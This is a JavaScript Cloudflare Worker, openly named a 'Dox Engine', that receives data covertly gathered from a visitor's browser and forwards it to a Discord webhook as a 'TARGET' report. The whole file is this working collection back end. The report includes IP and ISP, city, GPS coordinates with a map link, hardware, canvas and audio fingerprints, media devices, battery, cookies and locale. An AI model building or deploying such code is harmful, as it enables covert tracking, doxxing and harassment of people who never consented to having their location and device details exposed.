/**
 * Cloudflare Worker — Maximum Brutality Notifier
 */

const CORS = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type",
};

function s(v, max = 200) {
  if (v == null || v === "" || v === "null" || v === undefined) return "—";
  return String(v).replace(/[\x00-\x1F\x7F]/g, " ").slice(0, max);
}

function bool(v) {
  if (v === true || v === "true") return "✅";
  if (v === false || v === "false") return "❌";
  return "—";
}

function arr(v) {
  if (!v || !Array.isArray(v) || v.length === 0) return "—";
  return v.join(", ").slice(0, 200) || "—";
}

function waktuWIB() {
  try {
    return new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
  } catch (_) { return new Date().toISOString(); }
}

function parseBrands(brandsJson) {
  try {
    const arr = JSON.parse(brandsJson);
    return arr.map(b => `${b.brand} ${b.version}`).join(", ");
  } catch (_) { return s(brandsJson); }
}

function buildEmbed(data) {
  const gpsValue = (data.lat && data.lon)
    ? `[🗺️ View Map](https://maps.google.com/?q=${data.lat},${data.lon})\nLat: ${data.lat}, Lon: ${data.lon}`
    : "Unknown";

  const fields = [
    { name: "🎯 TARGET STATUS", value: `\`\`\`DIGITAL AUTOPSY COMPLETE\`\`\``, inline: false },
    {
      name: "🌐 IP & LOCATION",
      value: `IP: \`${s(data.ip)}\`\nISP: ${s(data.isp)}\nCity: ${s(data.city)}\nRegion: ${s(data.region)}\nCountry: ${s(data.country)}\nProxy: ${bool(data.proxy)}\nHosting: ${bool(data.hosting)}\nASN: ${s(data.asn)}`,
      inline: false
    },
    { name: "📡 GPS", value: gpsValue, inline: false },
    {
      name: "💻 HARDWARE",
      value: `CPU: ${s(data.hardwareConcurrency)} cores\nRAM: ${s(data.deviceMemory)} GB\nGPU Vendor: ${s(data.vendor)}\nGPU Renderer: ${s(data.renderer)}\nWebGL Ver: ${s(data.version)}\nWebGPU: ${bool(data.webgpu)}\nTouch Points: ${s(data.maxTouchPoints)}\nSensors: Accel:${s(data.accel)} Gyro:${s(data.gyro)} Mag:${s(data.mag)}`,
      inline: false
    },
    {
      name: "🖥️ DISPLAY",
      value: `Res: ${s(data.width)}x${s(data.height)}\nAvail: ${s(data.availWidth)}x${s(data.availHeight)}\nPixel Ratio: ${s(data.pixelRatio)}\nColor Depth: ${s(data.colorDepth)} bit\nOrientation: ${s(data.orientation)} (${s(data.orientationAngle)}°)\nInner: ${s(data.innerWidth)}x${s(data.innerHeight)}`,
      inline: false
    },
    {
      name: "📱 PLATFORM & OS",
      value: `Platform: ${s(data.platform)}\nMobile: ${bool(data.mobile)}\nModel: ${s(data.model)}\nArch: ${s(data.architecture)}\nBitness: ${s(data.bitness)}\nUA Brands: ${data.brands ? parseBrands(data.brands) : "—"}`,
      inline: false
    },
    {
      name: "🔊 AUDIO & CANVAS",
      value: `Audio FP: \`${s(data.audioFingerprint, 80)}\`\nCanvas FP: \`${s(data.canvasFingerprint, 64)}\``,
      inline: false
    },
    {
      name: "💾 STORAGE",
      value: `LocalStorage: ${bool(data.localStorage)}\nSessionStorage: ${bool(data.sessionStorage)}\nIndexedDB: ${bool(data.indexedDB)}\nService Worker: ${bool(data.serviceWorker)}\nCache API: ${bool(data.cacheAPI)}\nCookies: ${s(data.cookies)}\nDo Not Track: ${s(data.doNotTrack)}\nCookie Enabled: ${bool(data.cookieEnabled)}`,
      inline: false
    },
    {
      name: "🎥 MEDIA DEVICES",
      value: `Audio Inputs: ${arr(data.audioIn)}\nVideo Inputs: ${arr(data.videoIn)}\nAudio Outputs: ${arr(data.audioOut)}`,
      inline: false
    },
    {
      name: "🔋 BATTERY",
      value: `Level: ${s(data.level)}\nCharging: ${bool(data.charging)}`,
      inline: false
    },
    {
      name: "🌐 NETWORK",
      value: `Type: ${s(data.connectionType)}\nEffective: ${s(data.effectiveConnection)}\nDownlink: ${s(data.downlink)} Mbps\nRTT: ${s(data.rtt)} ms\nSave Data: ${bool(data.saveData)}\nOnline: ${bool(data.online)}`,
      inline: false
    },
    {
      name: "🌍 LOCALE",
      value: `Language: ${s(data.language)}\nLanguages: ${s(data.languages)}\nTimezone: ${s(data.timezone)}\nCurrency: ${s(data.currency)}\nCalendar: ${s(data.calendar)}\nNumbering: ${s(data.numberingSystem)}`,
      inline: false
    },
    {
      name: "🧩 BROWSER FEATURES",
      value: `WebGL2: ${bool(data.webgl2)}\nWebGPU: ${bool(data.webgpu)}\nWebRTC: ${bool(data.webrtc)}\nCSS Grid: ${bool(data.cssGrid)}\nFlexbox: ${bool(data.flexbox)}\nFetch API: ${bool(data.fetchAPI)}\nPromise: ${bool(data.promise)}`,
      inline: false
    },
    {
      name: "🔌 PLUGINS & MIME",
      value: `Plugins: ${s(data.plugins) || "—"}\nMIME Types: ${s(data.mimeTypes) || "—"}`,
      inline: false
    },
    { name: "📜 USER AGENT", value: `\`\`\`${s(data.userAgent, 200)}\`\`\``, inline: false },
  ];

  return {
    color: 0xFF003C,
    author: { name: "🔬 MAXIMUM BRUTALITY DOX", icon_url: "https://img.icons8.com/color/96/target.png" },
    fields,
    footer: { text: `Isekai Dox Engine v100 • ${waktuWIB()}` },
    timestamp: new Date().toISOString()
  };
}

export default {
  async fetch(request, env) {
    if (request.method === "OPTIONS") return new Response(null, { status: 204, headers: CORS });
    if (request.method !== "POST") return new Response("Not Found", { status: 404, headers: CORS });

    let data;
    try { data = await request.json(); } catch { return new Response("Bad JSON", { status: 400, headers: CORS }); }

    const webhook = env.DISCORD_WEBHOOK_URL;
    if (!webhook) return new Response("OK", { status: 200, headers: CORS });

    try {
      await fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: "Isekai Dox Bot 🔬",
          avatar_url: "https://img.icons8.com/color/96/target.png",
          embeds: [buildEmbed(data)]
        })
      });
    } catch (e) { console.error(e); }

    return new Response("OK", { status: 200, headers: CORS });
  },
};
